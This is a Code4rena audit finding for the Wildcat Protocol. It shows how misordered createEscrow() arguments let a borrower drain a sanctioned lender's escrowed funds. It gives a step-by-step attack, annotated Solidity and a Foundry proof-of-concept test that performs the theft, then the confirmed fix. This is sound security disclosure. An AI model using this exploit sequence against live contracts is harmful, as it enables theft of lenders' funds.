---
# Core Classification
protocol: Wildcat Protocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 29012
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-10-wildcat
source_link: https://code4rena.com/reports/2023-10-wildcat
github_link: https://github.com/code-423n4/2023-10-wildcat-findings/issues/68

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 36
finders:
  - ZdravkoHr
  - 0xSwahili
  - deth
  - 0xAsen
  - nobody2018
---

## Vulnerability Title

[H-06] Borrower can drain all funds of a sanctioned lender

### Overview


This bug report is about a critical issue in the `WildcatMarketBase#_blockAccount()` function, which is used to block a sanctioned lender. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.

The execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the `accountAddress` is sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order.

This vulnerability can be exploited by a malicious borrower as follows:
1. Bob The Borrower creates a market.
2. Bob authorizes Larry The Lender as a lender in the created market.
3. Larry deposits funds into the market.
4. Larry gets sanctioned in Chainalysis.
5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.
6. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)`.
7. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`.
8. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` and gains access to all of Larry's assets.

The misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned, thus allowing Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens.

The recommended mitigation steps for this issue is to fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`. The bug has been successfully mitigated.

### Original Finding Content


### Lines of code

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174><br>
<https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170>

### Impact

The `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.

The execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the `accountAddress` is sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order.

That means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.

### Proof of Concept

Consider this scenario to illustrate how the issue can be exploited:
1.  Bob The Borrower creates a market.
2.  Bob authorizes Larry The Lender as a lender in the created market.
3.  Larry deposits funds into the market.
4.  Larry gets sanctioned in Chainalysis.
5.  Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.
6.  Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)`.
7.  Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`.
8.  After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` and gains access to all of Larry's assets.

Now, let's delve into the specifics and mechanics of the vulnerability:

The `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.

```solidity
//@audit                                                     Larry
//@audit                                                       â†“
function _blockAccount(MarketState memory state, address accountAddress) internal {
  Account memory account = _accounts[accountAddress];
  // ...
  account.approval = AuthRole.Blocked;
  // ...
  account.scaledBalance = 0;
  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
	accountAddress, //@audit â† Larry
	borrower,       //@audit â† Bob
	address(this)
  );
  // ...
  _accounts[escrow].scaledBalance += scaledBalance;
  // ...
}
```

In the code snippet, notice the order of arguments passed to `createEscrow()`:

```solidity
createEscrow(accountAddress, borrower, address(this));
```

However, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:

```solidity
function createEscrow(
	address borrower, //@audit â† Larry
	address account,  //@audit â† Bob
	address asset
) public override returns (address escrowContract) {
  // ...
  // @audit                        ( Larry  ,   Bob  , asset)
  // @audit                            â†“         â†“       â†“
  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);
  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();
  // ...
}
```

The `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:

```solidity
constructor() {
  sentinel = msg.sender;  
  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();
//     â†‘        â†‘       â†‘   
//(  Larry ,   Bob  , asset) are the params fetched here. @audit
}
```

However, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert.

```solidity
function canReleaseEscrow() public view override returns (bool) {
	//@audit                                                 Larry      Bob
	//                                                         â†“         â†“
	return !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);
}
```

The misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.

```solidity
//@audit                       Larry              Bob
//                               â†“                 â†“
function isSanctioned(address borrower, address account) public view override returns (bool) {
 return
   !sanctionOverrides[borrower][account] && // true
   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false
}
```

Thus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:

```solidity
function releaseEscrow() public override {
  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

  uint256 amount = balance();
  
  //@audit                 Bob   Larry's $
  //                        â†“       â†“
  IERC20(asset).transfer(account, amount);

  emit EscrowReleased(account, asset, amount);
}
```

After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.

Below is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:

```solidity
import 'src/WildcatSanctionsEscrow.sol';

import "forge-std/console2.sol";
```

Add the following test `test/market/WildcatMarketConfig.t.sol` as well:

```solidity
function test_borrowerCanStealSanctionedLendersFunds() external {
  vm.label(borrower, "bob"); // Label borrower for better trace readability

  // This is Larry The Lender
  address larry = makeAddr("larry");

  // Larry deposists 10e18 into Bob's market
  _deposit(larry, 10e18);

  // Larry's been a bad guy and gets sanctioned
  sanctionsSentinel.sanction(larry);

  // Larry gets nuked by the borrower
  vm.prank(borrower);
  market.nukeFromOrbit(larry);

  // The vulnerable escrow in which Larry's funds get moved
  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));
  vm.label(vulnerableEscrow, "vulnerableEscrow");

  // Ensure Larry's funds have been moved to his escrow
  assertEq(market.balanceOf(larry), 0);
  assertEq(market.balanceOf(vulnerableEscrow), 10e18);

  // Malicious borrower is able to release the escrow due to the vulnerability
  vm.prank(borrower);
  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();

  // Malicious borrower has all of Larry's tokens
  assertEq(market.balanceOf(borrower), 10e18);

  // The borrower authorizes himself as a lender in the market
  _authorizeLender(borrower);

  // Queue withdrawal of all funds
  vm.prank(borrower);
  market.queueWithdrawal(10e18);

  // Fast-forward to when the batch duration expires
  fastForward(parameters.withdrawalBatchDuration);
  uint32 expiry = uint32(block.timestamp);

  // Execute the withdrawal
  market.executeWithdrawal(borrower, expiry);

  // Assert the borrower has drained all of Larry's assets
  assertEq(asset.balanceOf(borrower), 10e18);
}
```

Run the PoC like this:

```sh
forge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
```

### Recommended Mitigation Steps

Fix the order of parameters in `WildcatSanctionsSentinel#createEscrow(borrower, account, asset)`:

```diff
  function createEscrow(
-   address borrower,
+   address account,
-   address account,
+   address borrower,
    address asset
  ) public override returns (address escrowContract) {
```

### Assessed type

Error

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1803354649):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/2e111fc1f20d707eb78ac8a34eac4f751f6da474).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/68#issuecomment-1810740649)**

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Wildcat Protocol |
| Report Date | N/A |
| Finders | ZdravkoHr, 0xSwahili, deth, 0xAsen, nobody2018, SovaSlava, cartlex\_, 3docSec, Silvermist, YusSecurity, MiloTruck, tallo, kodyvim, Vagner, DeFiHackLabs, 0xDING99YA, GREY-HAWK-REACH, ast3ros, VAD37, d3e4, nirlin, 0xbepresent, Yanchuan, gizzy, Aymen0909, ggg\_ttt\_hhh, sl1, serial-coder, 0xKbl, xeros, AS, TrungOre, KeyKiril, QiuhaoLi, 0xCiphky, rvierdiiev |

### Source Links

- **Source**: https://code4rena.com/reports/2023-10-wildcat
- **GitHub**: https://github.com/code-423n4/2023-10-wildcat-findings/issues/68
- **Contest**: https://code4rena.com/reports/2023-10-wildcat

### Keywords for Search

`vulnerability`

